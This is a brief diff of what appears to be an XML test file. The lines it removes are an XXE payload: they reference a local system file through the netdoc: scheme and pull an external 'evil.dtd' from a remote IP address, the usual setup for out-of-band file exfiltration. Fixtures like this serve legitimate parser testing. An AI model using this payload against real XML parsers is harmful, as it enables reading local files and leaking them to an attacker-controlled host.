@@ -1,11 +1,3 @@
-<!DOCTYPE data [
-<!ENTITY % file SYSTEM
-"netdoc:/sys/power/image_size">
-<!ENTITY % dtd SYSTEM
-"http://77.244.22.184/evil.dtd">
-%dtd;
-]>
-
 <test>
   
 </test>    
